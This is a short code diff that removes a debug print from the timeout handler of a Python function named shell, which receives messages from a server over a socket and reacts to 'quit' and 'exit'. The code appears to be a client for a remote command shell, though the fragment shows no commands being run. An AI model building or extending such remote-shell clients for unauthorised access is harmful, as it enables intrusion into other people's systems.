@@ -208,7 +208,6 @@ def shell(sock: socket.socket) -> None:
         try:
             msg_from_server = recv_msg(sock)
         except socket.timeout:
-            print("t")
             continue
         # For certain keywords, run the appropriate action
         if msg_from_server in ["quit", "exit"]:  # Server side connection termination signal
